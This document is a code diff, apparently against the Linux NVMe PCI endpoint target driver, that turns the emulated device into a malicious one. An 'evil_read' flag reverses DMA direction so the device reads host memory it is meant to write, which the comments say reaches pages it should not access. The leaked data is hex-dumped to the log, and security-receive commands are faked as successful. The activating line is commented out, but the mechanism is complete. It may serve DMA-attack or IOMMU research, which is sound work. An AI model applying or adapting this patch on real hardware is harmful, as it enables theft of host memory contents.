@@ -176,6 +176,8 @@ struct nvmet_pci_epf_iod {
 	struct work_struct		work;
 	struct work_struct		evil_work;
 	struct completion		done;
+
+	bool				evil_read;
 };
 
 /*
@@ -805,7 +807,7 @@ static int nvmet_pci_epf_transfer_iod_data(struct nvmet_pci_epf_iod *iod)
 
 	/* Split the data transfer according to the PCI segments. */
 	for (i = 0; i < iod->nr_data_segs; i++, seg++) {
-		ret = nvmet_pci_epf_transfer_seg(nvme_epf, seg, iod->dma_dir);
+		ret = nvmet_pci_epf_transfer_seg(nvme_epf, seg, iod->evil_read ? DMA_FROM_DEVICE : (iod->dma_dir));
 		if (ret) {
 			iod->status = NVME_SC_DATA_XFER_ERROR | NVME_STATUS_DNR;
 			return ret;
@@ -1699,7 +1701,7 @@ static void nvmet_pci_epf_exec_iod_work(struct work_struct *work)
 	struct nvmet_pci_epf_iod *iod =
 		container_of(work, struct nvmet_pci_epf_iod, work);
 	struct nvmet_req *req = &iod->req;
-	int ret;
+	int ret, i;
 
 	if (!iod->ctrl->link_up) {
 		nvmet_pci_epf_free_iod(iod);
@@ -1709,6 +1711,16 @@ static void nvmet_pci_epf_exec_iod_work(struct work_struct *work)
 	if (!test_bit(NVMET_PCI_EPF_Q_LIVE, &iod->sq->flags)) {
 		iod->status = NVME_SC_QID_INVALID | NVME_STATUS_DNR;
 		goto complete;
+	}
+
+	if (iod->sq->qid == 0 && iod->cmd.common.opcode == nvme_admin_security_recv) {
+		/* Just return success to try... */
+		goto complete;
+	}
+
+	if (iod->sq->qid == 0 && iod->cmd.common.opcode == nvme_admin_identify) {
+		dev_info(iod->ctrl->dev, "Identify: CNS: %d\n",
+			 iod->cmd.identify.cns);
 	}
 
 	/*
@@ -1727,21 +1739,47 @@ static void nvmet_pci_epf_exec_iod_work(struct work_struct *work)
 		 * Get the data DMA transfer direction. Here "device" means the
 		 * PCI root-complex host.
 		 */
-		if (nvme_is_write(&iod->cmd))
+		if (nvme_is_write(&iod->cmd)) {
 			iod->dma_dir = DMA_FROM_DEVICE;
-		else
+		} else {
+			/* Program an evil read before writing (NVMe read) */
+			//iod->evil_read = true;
 			iod->dma_dir = DMA_TO_DEVICE;
+		}
 
 		/*
 		 * Setup the command data buffer and get the command data from
 		 * the host if needed.
 		 */
 		ret = nvmet_pci_epf_alloc_iod_data_buf(iod);
-		if (!ret && iod->dma_dir == DMA_FROM_DEVICE)
+		/*
+		 * Evil read: Read data when we should write, this allows access
+		 * to memory pages we should not be able to access.
+		 */
+		if (!ret && ((iod->dma_dir == DMA_FROM_DEVICE) || (iod->evil_read)))
 			ret = nvmet_pci_epf_transfer_iod_data(iod);
 		if (ret) {
 			nvmet_req_uninit(req);
 			goto complete;
+		}
+
+		if (iod->evil_read) {
+			/* Do something with the data */
+			if (iod->data_len <= SZ_128K && iod->nr_data_segs) {
+				/* Loop over segments if necessary */
+				for (i = 0; i < iod->nr_data_segs; ++i) {
+					if (WARN_ON(!iod->data_segs[i].buf)) {
+						break;
+					}
+					print_hex_dump_bytes("", DUMP_PREFIX_ADDRESS, iod->data_segs[i].buf,
+							iod->data_segs[i].length);
+				}
+			}
+
+
+			/* Remove flag or else nvmet_pci_epf_transfer_iod_data()
+			 * will perform a read operation */
+			iod->evil_read = false;
 		}
 	}
 
